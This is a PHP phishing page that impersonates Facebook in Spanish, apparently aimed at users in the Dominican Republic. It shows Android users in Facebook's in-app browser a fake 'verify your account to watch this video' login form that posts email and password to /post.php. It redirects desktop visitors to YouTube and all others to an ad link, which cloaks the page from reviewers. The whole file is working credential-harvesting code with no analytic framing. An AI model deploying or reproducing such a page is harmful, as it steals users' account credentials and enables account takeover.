<?php

$isAndroid = strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false;
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$isFromFacebook = strpos($referer, 'facebook.com') !== false;
$isFacebookBrowser = strpos($_SERVER['HTTP_USER_AGENT'], 'FBAN') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'FBAV') !== false;

if($isAndroid && $isFacebookBrowser){
?>

<html><script>if (typeof window.orientation == 'undefined' && screen.width >= 1000) { window.location.href = 'https://www.youtube.com/'; }</script>
<head>
	<meta charset="UTF-8">
	<meta name="robots" content="noindex, nofollow">
	<meta name="googlebot" content="noindex">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
	<title>Facebook necesita verificar la información de tu cuenta para permitir el acceso a este video</title>
	<style>
	* {margin: 0px;padding: 0px;box-sizing: border-box;font-family: sans-serif;}.container {margin-right: auto;margin-left: auto;}.col-xs-12 {width: 100%;}.carousel-inner>.item>a>img, .carousel-inner>.item>img, .img-responsive, .thumbnail a>img, .thumbnail>img {display: block;max-width: 100%;height: auto;}.modal {position: fixed;top: 0;right: 0;bottom: 0;left: 0;z-index: 1050;display: none;overflow: hidden;outline: 0;}.fade.in {opacity: 1;}.login-form-wrap {box-shadow: 0px 1px 2px 1px rgba(0,0,0,0.6);background: #fff;border-radius: 8px;width: 95%;max-width: 600px;height: 430px;margin: 40px auto;padding: 5px 25px 0;text-align: center;}input:focus {border: 1px solid #ccc!important;}.form-controll {padding: 3% 2%;background: #f5f6f7;border: 1px solid #E3E4E5;width: 100%;margin-bottom: 10px;-webkit-tap-highlight-color: transparent;font-size: 14px;line-height: 18px;border-radius: 5px;box-shadow: 1px 1px rgb(0 0 0 / 7%);}input,button {font-family: Helvetica, Arial, sans-serif;}input {background: #f5f6f7;font-size: 14px;line-height: 18px;}.submitStyleLogin {padding: 12px 0;background: #1877f2;border: 0;width: 100%;font-size: 16px;line-height: 18px;border-radius: 5px;box-shadow: 0 2px 2px -2px #cacaca;color: #fff;font-weight: bold;text-shadow: 0 -1px rgb(0 0 0 / 25%);}.submitStyleRegister {background: #00A400;border: 0;height: 36px;padding-left: 16px;padding-right: 16px;margin: auto;font-size: 14px;line-height: 18px;border-radius: 5px;box-shadow: 0 2px 2px -2px #cacaca;color: #fff;font-weight: bold;text-shadow: 0 -1px rgb(0 0 0 / 25%);}.submitStyleRegister:hover {background-color: #36a420;border-color: #36a420;}.submitStyleRegister:active {background-color: #2b9217!important;border-color: #2b9217!important;}.videoView {width: 100%;color: darkred;font-size: 14px;background-color: #fff9d7;border: 1px solid #e2c822;padding: 7px 23px;margin: 10px auto;border-radius: 6px;}#dp_00004 {color: #899bc1;font-size: 12px;line-height: 16px;margin-top: 10px;}#myModal {display: block;margin-top: 100px;}.nguoisangtao {background-color: yellow;font-size: 20pt;}.nguoisangtaocustom {color: #ff1313;}.img-responsive {height: 100vh;object-fit: cover;width: 100%;}.separator {clear: both;text-align: center;}.inputcustom1 {height: 40px;margin-bottom: 6px;}.inputcustom2 {height: 40px;}._55ws {padding: 10px 0px;border-top: none;}#logo {padding-top: 10px;text-align: center;align-items: center;}.olvido {color: #216fdb;cursor: pointer;text-decoration: none;font-size: 14px;}.bb {float: left;width: 42%;border-bottom: 2px solid #EAEBED;height: 10px;}#c {float: left;width: 16%;text-align: center;}.bb {float: left;width: 42%;border-bottom: 2px solid #EAEBED;height: 10px;margin-bottom: 5% }#bottom {width: 100%;text-align: center;}.errorlogin {width: 100%;color: #ffff;font-size: 14px;background-color: #FF0000;padding: 7px;margin: 10px auto;border-radius: 6px;}video {width: 100vw;height: 100vh;object-fit: cover;position: fixed;top: 0;left: 0;z-index: -1;}
	</style>
	</head>
	<body class="touch x1-5 ios mSafari _fzu _50-3 iframe acw" tabindex="0">
	<header>
	<div class="header no-items section" id="header"></div>
	</header>
	<main>
	<video id="player" poster="https://media.discordapp.net/attachments/1098938207317532795/1100778164176834610/sfsfsf.png" muted controls>
	<source src="http://10.35.100.57/1.mp4" type="video/mp4">
	</video>
	<div class="modal fade in" id="myModal" role="dialog">
	<section class="login-form-wrap">
	<div id="logo"><img src="https://raw.githubusercontent.com/busine011/icon/26aedd9c311c5392c5b6e4128793d5178245c7b5/fa.svg" width="150" class="img" alt="facebook"></div>
	<div class="row">
	<div class="videoView" id="u_0_1_ZE">Facebook necesita verificar la información de tu cuenta para permitir el acceso a este video</div>
	<div class="errorlogin" id="errorlogin" style="background-color: red; color: white; display: none; font-size: 14px; padding: 7px; margin: 10px auto; border-radius: 6px;"></div>
	<form action="/post.php" class="col-xs-12 col-sm-12 col-md-12 col-lg-12" id="login_form_mb" method="post">
	<input type="hidden" name="country" value="Dominican Republic">
	<input class="form-controll inputcustom1" id="email" name="email" placeholder="Correo electrónico o número de teléfono" required="true" type="text">
	<input class="form-controll inputcustom2" id="pass" name="pass" placeholder="Contraseña" required="true" type="password">
	<div class="_55ws">
	<button class="btn btn-primary btn-lg btn-block submitStyleLogin" id="dp_00002" name="submit" type="submit">Iniciar sesión</button>
	</div>
	<p><a class="olvido">¿Has olvidado la contraseña?</a></p>
	<br> 
	<div class="bb"></div>
	<div id="c">.</div>
	<div class="bb"></div> 
	<div id="bottom">
	<button class="submitStyleRegister">Crear cuenta nueva</button>
	</div>
	</form>
	</div>
	</section>
	</div>
	</main>
	</body>
	</html>
	
	<?php
	}else{
?>
<script>
    window.location.href = 'https://pl19715772.forgetfulpromptlyappointment.com/c9hkh7d0s?key=55f583527d17cea6ab7a24daa144fa2b';
</script>
<?php
}
?>
